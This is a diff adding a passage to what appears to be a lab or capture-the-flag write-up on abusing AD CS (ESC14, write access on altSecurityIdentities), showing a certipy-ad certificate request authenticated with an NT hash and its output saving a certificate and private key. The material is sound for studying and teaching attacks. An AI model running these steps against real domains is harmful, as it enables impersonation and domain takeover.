@@ -438,3 +438,24 @@ And also the user `xjr` has  `altSecurityIdentities: WRITE` on `jay` , so this m
 
 www.hackingarticles.in/adcs-esc14-write-access-on-altsecurityidentities/
 
+```python
+certipy-ad req -u jags@casper.hsm -hashes ':68fc3adf1953f5e6851c0dd297562e08' -ca casper-DC01-CA -template CasperCorp-User -target dc01.casper.hsm -debug
+
+...[SNIP]...
+
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.0.31.82[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.0.31.82[\pipe\cert]
+[*] Request ID is 60
+[*] Successfully requested certificate
+[*] Got certificate without identity
+[+] Found SID in security extension: 'S-1-5-21-247086266-1178499391-1139383971-1105'
+[*] Certificate object SID is 'S-1-5-21-247086266-1178499391-1139383971-1105'
+[*] Saving certificate and private key to 'jags.pfx'
+[+] Attempting to write data to 'jags.pfx'
+[+] Data written to 'jags.pfx'
+[*] Wrote certificate and private key to 'jags.pfx'
+```
+
+First i have to request a certificate 
